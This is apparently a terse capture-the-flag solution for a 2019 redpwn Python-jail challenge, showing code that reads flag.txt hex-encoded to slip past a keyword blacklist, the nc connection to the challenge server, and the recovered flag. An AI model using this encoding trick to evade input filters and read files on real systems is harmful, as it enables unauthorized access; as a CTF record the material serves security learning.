"with open('flag.txt', 'r') as f: print(f.read())".encode('hex')
# '77697468206f70656e2827666c61672e747874272c202772272920617320663a207072696e7428662e72656164282929'

# nc chall2.2019.redpwn.net 6006
# wow! there's a file called flag.txt right here!
# >>> '77697468206f70656e2827666c61672e747874272c202772272920617320663a207072696e7428662e72656164282929'.decode('hex')
# flag{bl4ckl1sts_w0rk_gre3344T!}
